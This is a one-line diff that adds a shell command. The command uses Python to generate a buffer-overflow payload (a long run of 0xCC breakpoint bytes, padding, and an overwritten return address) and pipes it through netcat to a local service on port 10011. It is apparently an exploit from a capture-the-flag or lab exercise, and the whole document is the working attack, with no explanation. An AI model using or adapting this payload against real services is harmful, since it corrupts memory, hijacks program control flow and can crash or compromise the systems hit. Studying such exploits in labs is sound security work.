@@ -1,0 +1,1 @@
+python -c 'print "\xcc"*65536+"B"*8+"\x00\xd0\xfe\xff"' | nc localhost 10011
